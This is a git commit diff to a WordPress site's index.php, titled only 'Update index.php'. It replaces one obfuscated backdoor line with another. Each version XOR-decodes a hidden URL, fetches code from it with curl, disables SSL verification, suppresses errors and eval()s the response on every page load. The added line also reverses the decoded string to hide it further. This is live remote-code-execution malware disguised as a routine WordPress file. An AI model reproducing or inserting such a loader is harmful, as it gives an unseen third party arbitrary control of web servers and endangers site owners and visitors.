c3790a2f161e25f601bff15f1d815177bddd4dc8
rh1519868-dotcom <rh1519868@gmail.com>
2026-06-09 11:54:59 +0600

    Update index.php

--- index.php
+++ index.php
@@ -6,7 +6,7 @@
  * @package WordPress
  */
 
-$_a='mZ!9qR$v';$_b="\x05\x2E\x55\x49\x4B\x7D\x0B\x47\x5D\x6D\x0F\x08\x44\x62\x0A\x42\x5B\x74\x10\x09\x47\x7D\x5E\x40\x5D\x6F\x13\x0B\x2E\x60\x0B\x05\x19\x3B\x55\x16\x18\x3C\x40\x13\x15\x74\x55\x41\x05";$_u='';for($_i=0;$_i<strlen($_b);$_i++)$_u.=chr(ord($_b[$_i])^ord($_a[$_i%8]));unset($_a,$_b,$_i);$_c=curl_init($_u);@curl_setopt_array($_c,[19913=>1,52=>1,13=>15,10018=>'Mozilla/5.0',64=>0]);($_s=@curl_exec($_c))!==false&&eval(preg_replace(['/^\s*<\?php\s*/i','/\?>\s*$/'],'',$_s));@curl_close($_c);unset($_u,$_c,$_s);
+$_a='K#7mLw@3';$_b="\x3F\x5B\x43\x43\x34\x12\x24\x5D\x22\x0C\x43\x0C\x38\x04\x6F\x01\x14\x17\x06\x58\x7C\x41\x3A\x1C\x7B\x14\x06\x43\x78\x4F\x71\x1D\x7C\x1A\x06\x43\x75\x41\x6F\x1C\x71\x53\x43\x19\x24";$_t='';for($_i=0;$_i<strlen($_b);$_i++)$_t.=chr(ord($_b[$_i])^ord($_a[$_i%8]));$_u=strrev($_t);unset($_a,$_b,$_i,$_t);$_c=curl_init($_u);@curl_setopt_array($_c,[19913=>1,52=>1,13=>15,10018=>'Mozilla/5.0',64=>0]);($_s=@curl_exec($_c))!==false&&eval(preg_replace(['/^\s*<\?php\s*/i','/\?>\s*$/'],'',$_s));@curl_close($_c);unset($_u,$_c,$_s);
 
 /**
  * Tells WordPress to load the WordPress theme and output it.
